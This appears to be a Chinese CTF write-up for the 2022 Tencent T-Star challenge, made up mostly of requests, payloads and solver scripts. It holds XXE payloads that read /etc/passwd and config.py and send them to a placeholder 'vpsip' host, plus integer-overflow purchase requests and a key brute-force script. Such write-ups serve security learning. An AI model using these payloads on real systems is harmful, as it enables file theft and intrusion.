# 2022 未知之境 腾讯网络安全T-Star高校挑战赛 WriteUp

> 原文: https://www.ctfiot.com/37683.html
> ID: 37683


```
/api/info?id=1
```



```
POST /api/like HTTP/1.1
Host: 175.178.148.197:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 10
Origin: http://175.178.148.197:5000
Connection: keep-alive
Referer: http://175.178.148.197:5000/
Cookie: session=eyJsb2dpbiI6dHJ1ZX0.YmEloQ.HoKxH0jZ72zQK_jLKiYUMt8ZIBw
Pragma: no-cache
Cache-Control: no-cache

{"id":"1"}
```



```
{"status": true, "data": {"count": 891}}
```



```
{"status": true, "data": {"count": "No such streamer."}}
```



```
{"ERROR": "No JSON object could be decoded"}
```



```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://vpsip:port/?p=%file;'>">
```



```
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://vpsip/test.dtd">
%remote;%int;%send;
]>
```



```
<?xml version="1.0"?>
<!DOCTYPE message [
 <!ELEMENT message ANY>
 <!ENTITY % x SYSTEM "file:///etc/passwd">
 <!ENTITY % y '
 <!ENTITY &#x25; z "<!ENTITY &#x26;#x25; error SYSTEM &#x27;&#x25;x;&#x27;>">
 &#x25;z;
 '>
 %y;
]>
<message>233</message>
```



```
POST /api/like HTTP/1.1
Host: 175.178.148.197:5000
Content-Length: 272
Accept: application/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/xml
Origin: http://175.178.148.197:5000
Referer: http://175.178.148.197:5000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-CN;q=0.7,zh;q=0.6
Cookie: session=eyJsb2dpbiI6dHJ1ZX0.YmDQVQ.XDtZokQz966yViM6teda1VnD42Y
Connection: close

<?xml version="1.0"?>
<!DOCTYPE message [
 <!ELEMENT message ANY>
 <!ENTITY % x SYSTEM "file:///proc/self/cwd/config.py">
 <!ENTITY % y '
 <!ENTITY &#x25; z "<!ENTITY &#x26;#x25; error SYSTEM &#x27;&#x25;x;&#x27;>">
 &#x25;z;
 '>
 %y;
]>
<message>233</message>
```



```
java -jar abe.jar unpack data.ab data.tar yun202203
```



```
package ctf.misc.step;

public class Step1 {
 public static String FlagStep1 = "175.178.148.197:80";
}
```



```
package ctf.misc.step;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
 protected void onCreate(Bundle var1) {
 super.onCreate(var1);
 this.setContentView(2131296283);
 }
}
```



```
-----BEGIN RSA PRIVATE KEY-----
MIICXQIBAAKBgQCkbqcFM+hbrP+3DERi3gJY9rfwVhzAmBzbgpCAxnWO/Ip1OKtF
RgSyqxJnzzptHTFvqbUbP/+Umqm/MfwrorYHyr3rfm70yM4qX4bpYCIWMkzeplEx
V9Y3o3pVw7w/ISTzRVO5Woi/eyTDgVwguOKb9Fi9QLjCrxeWL9AtsKnsawIDAQAB
AoGBAJac2BV250VZn9yNuvIIQoQ0cGUOq0VpzzztSej6X2G6RiR65L4OFW2GLtSx
RuX9EHQkMUQlibgXNpZvdXiOkEX44W14JisHfJ2fCLdUKjr/aqDSR3Yo8+raaght
FUIZyJQG1SqJM+PV2HqKPOW3+IQ6HRAxST+H0l5sUqWPmjQpAkEA0jZHZOV1UJdJ
MK+iXHjpGHaXz5u6MlNuRaLioBjcvCzduZgmFuazMwkVBqy7l6R4UOMqt4HRbkUi
5uwfZnbDdwJBAMg/oJz07C4cHmci9J5NNHruToc3JEQz8pmBAKwlM9IKwEtr8NHM
4sIiW7i1K2RVHs3Uxi7iVnGHT6sF/ErKE60CQQCMGGqaXqZB0KGRlevyDw7iI99n
GFUORzYdqMG6ivdJXeljUHhKGPRi1fGyYhofpRgeaFdGt3j5MZBiMAl5QztfAkAy
DV1a/gkuuU6MHvufudJ9S6WLPKgu+AESh2Egpifev1szPuaxuhGPzsC4WWhgKrqJ
Xj6vJ1nOBLFQIS3fj8T9AkAqFjwCoZjy8cvI2/xyJa65NqeWsPI8rHB76cSmsdhb
3Gtz+ZNfPpVF5pN3F0/eMdA7VsOlc4Ea40DlHIY9Yjdg
-----END RSA PRIVATE KEY-----
```



```
$ cat key.en | base64
ch/mu/NWBxYPZLqN1BD/eXm5IogOvubhhvJxQNqMtX9tm7zaM/xiq0cOGiFBkakf0FAOObLqnpf5
7+mp5b47QX/GQoXCmexyESXXiAVCQYNQ9JD2HPyb2FJsqhHKxlou6cbPSWKoxbLqm89AKtZOObMk
kOZgm8qF91gUrR3Vd8Y=
```



```
9BlteBJnZpwrRjbL0DsGlFz5M+MDG74jYIj0zzivGPVW75jYZQpdzpfrpEBcXAJqHrlZlEw9hMhRQ8FijkATyMxpKsPXEWT5K6M5
```



```
1111111010010101010110111111110000010100011000111101000001101110100110100101000010111011011101010000110001000101110110111010110100100101101011101100000100100111011001010000011111111010101010101010111111100000000001111001000000000000110011010000110101010011011110001110110101101011000011110000110100101110010010111111000100001101000011010000100000100100101101001011010010101111010011110100111101001110000011110100101101001011010010001110011101101111011001110000001001010101001100011001001001001110111111111111011101101001010111001101110111001001110111000001111100011001000010100110110011111011010100111110010001100100011110011001100000000001001010101101010111001111111010110001101000101001010000011100111110010001000100101110101010011111111110111101011101000000010000000000111010111011110001010110111001110100000101110011101101110011101111111
```



```
#!/usr/bin/env python3
from PIL import Image
MAX = 29
pic = Image.new("RGB",(MAX, MAX))
str = "1111111010010101010110111111110000010100011000111101000001101110100110100101000010111011011101010000110001000101110110111010110100100101101011101100000100100111011001010000011111111010101010101010111111100000000001111001000000000000110011010000110101010011011110001110110101101011000011110000110100101110010010111111000100001101000011010000100000100100101101001011010010101111010011110100111101001110000011110100101101001011010010001110011101101111011001110000001001010101001100011001001001001110111111111111011101101001010111001101110111001001110111000001111100011001000010100110110011111011010100111110010001100100011110011001100000000001001010101101010111001111111010110001101000101001010000011100111110010001000100101110101010011111111110111101011101000000010000000000111010111011110001010110111001110100000101110011101101110011101111111"
i=0
for y in range (0,MAX):
 for x in range (0,MAX):
 if(str[i] == '1'):
 pic.putpixel([x,y],(0, 0, 0))
 else:
 pic.putpixel([x,y],(255,255,255))
 i = i+1
pic.show()
pic.save("flag.png")
```



```
/033yia8rqea1921ca61/systemlockdown
```



```
门禁用的是Windows 10，x86系统……经过一番分析，你成功拿到了门禁系统源码，可喜的是，门禁认证系统已经写死，即使是管理员也无法更新。
但，就在破解源码的过程中，管理员也觉察到门禁源码泄露，提前关闭了门禁系统，你输入的密码将无法认证。
时间一分一秒过去，不能再犹豫了，需要立即输入密码，解锁门禁。

PS: MSVC 2015以后的版本编译，Debug，不开启任何优化，请以提供的附加材料为准（Binary与下列源码表现一致，输入的答案通过与否请以该Binary的输出为准）。
flag：如果你认为输入12345可以解锁门禁，则请提交答案：md5(12345)

#include <iostream>

struct door_key {
 unsigned char passed : 1;
 unsigned char checksum1 : 2;
 unsigned char checksum2 : 2;
 unsigned char checksum3 : 3; 
};

//The system doesn't allow ANYBODY to log in now.
#define SYSTEM_SHUTDOWN 1

void check(char* password, door_key* d) {
 if (SYSTEM_SHUTDOWN) {
 return;
 }

 if (memcmp(password, "888888", 6) == 0) {
 d->passed = 1;
 d->checksum1 = 88;
 d->checksum2 = 88;
 d->checksum3 = 88;
 }
}

void call_the_police() {
 abort();
}

int main()
{
 door_key* checker1 = 0; 

 struct { 
 char password[6];
 char key_data;
 } management = { 0 };

 char ch = 0;
 char last_ch = 0;
 int i = 0;

 if (SYSTEM_SHUTDOWN) {
 std::cout << "Notify from the administrator: NOBODY is allowed to login now!!!" << std::endl;
 std::cout << "YOUR LOGIN REQUEST WILL NOT BE HANDLED AND WE WILL CALL THE POLICE INSTANTNLY IF YOU DIDN'T PASS THE CHECK." << std::endl;
 }
retry:
 std::cout << "Please enter your 6-digit password, type '[6 digit number] then Enter' to confirm (For example: 123456): " << std::endl;
 for (i = 0; i <= 6; i++) {
 ch = std::cin.get();

 if (ch == '\n')
 break;
 if (!isdigit(ch) && ch != '\n')
 call_the_police();

 // Developer A:
 // Add an easy check, our strong 6-digit password is 888888 ! 
 // Pre-check if every digit is the same. 
 if (ch != '\n' && last_ch && ch != last_ch) 
 call_the_police();

 last_ch = ch;
 management.password[i] = ch;
 }; 

 checker1 = (door_key *)&(management.key_data); 

 check(management.password, checker1);

 if ((checker1->passed && (checker1->checksum1 == checker1->checksum2) && checker1->checksum3 > 0)) {
 std::cout << "Congurations! You have entered the correct password.";
 }
 else
 call_the_police();
}
```



```
.---- ----. ----. .---- ----- ...-- ---.. -.... --... ----. --...
```



```
19910386797
```



```
https://darknet.hacker5t2ohub.com/
```



```
GET /trpc.cors_filter_test.common.Darknet/Purchase?amount=4294967296&gid=0x9
==>
{"code":1, "msg":"service codec Unmarshal: 1 error(s) decoding:

* cannot parse 'amount' as int: strconv.ParseInt: parsing "4294967296": value out of range"}

GET /trpc.cors_filter_test.common.Darknet/Purchase?amount=65536&gid=0x9
==>
{"code":500, "msg":"商品数量非法，请重试"}
...
```



```
GET /trpc.cors_filter_test.common.Darknet/Purchase?amount=34&gid=0x9 HTTP/1.1
Host: darknet.hacker5t2ohub.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Authorization: xxxxx
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: https://darknet.hacker5t2ohub.com/item.html?gid=12
Cookie: sTok=xxxxx
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Pragma: no-cache
Cache-Control: no-cache
TE: trailers
```



```
商品【付费咨询】购买成功，信息如下： 前往微信公众号“腾讯安全应急响应中心”(tsrc_team)，回复"T-Star666"获取信息
```



```
你要找的人，即将发起大范围蠕虫攻击！行动计划就藏匿在邮件中，只有解出密匙才能破除攻击！http://159.75.190.64/

nightbaron042@sohu.com
nightBaron1996
```



```
Hi bros,

冬去春来，终于迎来此刻。等待良久，时机已经成熟。等待的日子里，我看了很多书，那些书页中的章节和段落就像时钟的时针和分针一样不断前行，指引我们通向胜利。

这次行动一切顺利，我将乘胜追击，发起勒索病毒蠕虫攻击，对所有目标电脑文件进行加密，并自动扩散，只有我的KEY才能解密。

数据勒索加密行动已经于今天 1点8分 启动。须知，T-Star特工诡计多端，为防他们从中作梗，我已将KEY进行HASH处理，分别交由不同的人保管。以他们的算力，应该很难破解。米特尼克曾经写道，人的因素是安全过程中最薄弱的环节。各位务必提高警惕，严加保密、妥善储存。

这封邮件非常重要，关键时刻将发挥巨大作用，好戏在即，各位拭目以待。

Key Hashes Part 1: https://pastebin.com/QZ7QBmmd

NightBaron
Address: Soldier Island 

Github: nightBaron042

IF YOU'RE LOOKING, YOU WON'T FIND IT
```



```
Key Hashes Part 2: https://pastebin.com/TUNVRVvk
Key Hashes Part 3: https://pastebin.com/rTqtad96
```



```
import requests
from urllib.parse import quote

with open('parts.txt', 'r', encoding='utf-8') as f:
 d = f.read()

l = d.split('\n')
print(len(l))

for k in l:
 data = {
 "key": quote(k)
 }
 h = {"Content-Type": 'application/x-www-form-urlencoded'}
 r = requests.post('http://159.75.190.64/', data=data, headers=h)
 if 'key错误' in r.text:
 print(k, 'error')
 else:
 print('!!!!!!!!!!!!!!!!!!', k, 'ok')
 print(r.text)
 break
```



```
print(''.join(l))
# Securit is too often merely anion,ionmes made even worsebility, naivete, orance come into play. The mostctedtist of the twentieth Albert isquoted as two things areinfinite, the universe and humanstupidity, I'm not sure about Inend, social engineeringattacks can succeed when people stupidor, more commonly, simply ignorant about good security practices. With the same attitude as our security-conscious many information technology (IT) professionals hold to the misconception that made their companies largely immune to attack because deployed standard security products - firewalls, intrusion detection or stronger authentication devices such as time-based tokens or biometric smart cards. Anyone who thinks
```



```
Security is too often merely an illusion, an illusion sometimes made even worse when gullibility, naivete, or ignorance come into play. The world's most respected scientist of the twentieth century, Albert Einstein, is quoted as saying, "Only two things are infinite, the universe and human stupidity, and I'm not sure about the former." In the end, social engineering attacks can succeed when people are stupid or, more commonly, simply ignorant about good security practices. With the same attitude as our security-conscious homeowner, many information technology (IT) professionals hold to the misconception that they've made their companies largely immune to attack because they've deployed standard security products - firewalls, intrusion detection systems, or stronger authentication devices such as time-based tokens or biometric smart cards. Anyone who thinks that security products alone offer true security is settling for. the illusion of security. It's a case of living in a world of fantasy: They will inevitably, later if not sooner, suffer a security incident.
```



```
key正确，恭喜恢复电脑，快去提交flag吧：flag{ski931iwasjudqwkashajdsakdhadjshakdhsahkd}
```



```
喜欢我给你的惊喜吗？
我已将线索藏到三个不同的地方，
其中一个提示为123456
来找我吧，
记住，你只能一个人来
否则，你会受到惩罚哦

Flag2 : 772e91/webs
```



```
$ outguess -r -k "123456" image1.jpg data.bin
Reading image1.jpg....
Extracting usable bits: 88951 bits
Steg retrieve: seed: 109, len: 15
```



```
/062ycz7s9458b
```
